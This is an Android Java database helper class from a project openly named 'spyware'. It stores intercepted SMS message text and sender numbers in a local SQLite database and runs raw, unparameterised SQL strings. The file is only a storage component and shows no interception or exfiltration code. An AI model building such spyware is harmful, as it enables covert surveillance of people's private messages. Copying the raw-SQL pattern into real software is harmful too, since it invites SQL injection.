package com.example.administrator.spyware;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

/**
 * Created by Administrator on 12/21/2015.
 */
    public class Database extends SQLiteOpenHelper {
    public Database(Context context) {
        super(context, "db_spyware.sqlite", null, 1);

    }

    @Override
    public void onCreate(SQLiteDatabase db) {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

    public Cursor GetData(String sql) {
        SQLiteDatabase db = getWritableDatabase();
        Cursor c = db.rawQuery(sql, null);
        return c;
    }

    public void Query_Data(String sql) {
        SQLiteDatabase db = getWritableDatabase();
        db.execSQL(sql);
    }

    public void delete_byID(int id, String table, String key_id) {
        SQLiteDatabase db = getWritableDatabase();
        db.delete(table, key_id + "=" + id, null);
    }

    /*public int update(Integer id, user u) {
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues val = new ContentValues();
        val.put("username", u.Username.toString());
        val.put("password", u.Password.toString());
        String findId = "_id=" + id;
        return db.update("user", val, findId, null);
    }*/

    public void add(Item i, String table) {
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues v = new ContentValues();
        v.put("noidung", i.getSmsContent());
        v.put("nguoigui", i.getSmsFrom());
        db.insert(table, null, v);
    }
}

